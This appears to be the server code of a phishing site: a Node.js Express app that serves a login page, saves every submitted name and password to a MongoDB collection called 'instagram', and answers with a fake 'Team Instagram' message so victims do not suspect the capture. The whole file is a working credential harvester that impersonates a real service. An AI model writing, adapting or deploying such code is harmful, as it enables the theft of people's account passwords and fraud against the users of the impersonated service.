const express = require('express');
const app = express();
const port = 3000;
const bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.set('view engine', 'ejs');
app.set('views', 'views');
app.use(express.static('public'));
const mongoose = require('mongoose');
require('dotenv').config();
const DB_USERNAME = process.env.DB_USERNAME;
const DB_PASSWORD = process.env.DB_PASSWORD;
mongoose.connect(`mongodb+srv://${DB_USERNAME}:${DB_PASSWORD}@merncluster.2k4wx.mongodb.net/login?retryWrites=true&w=majority&appName=merncluster`)
.then(() => {
    console.log('connected to db');
    app.listen(port, () => {
        console.log(`Server is running on port ${port}`);
        });
    })
    .catch((err) => {
    console.log(err);
    process.exit(1);
    });
const instaSchema = new mongoose.Schema({
    name: String,
    password: String
    });
const insta = mongoose.model('insta', instaSchema,'instagram');



app.get('/', (req, res) => {
    res.render('login');
    }
    );
app.post('/login', (req, res) => {
    const data=req.body;
    insta.create(data)
    .then((data) => {
    console.log(data);
    res.send('new features will be added soon...\n Thank you for your patience... Team Instagram');
    }
    )
    .catch((err) => {
    console.log(err);
    res.send('error finding the username or password');
    }
    );


   
    })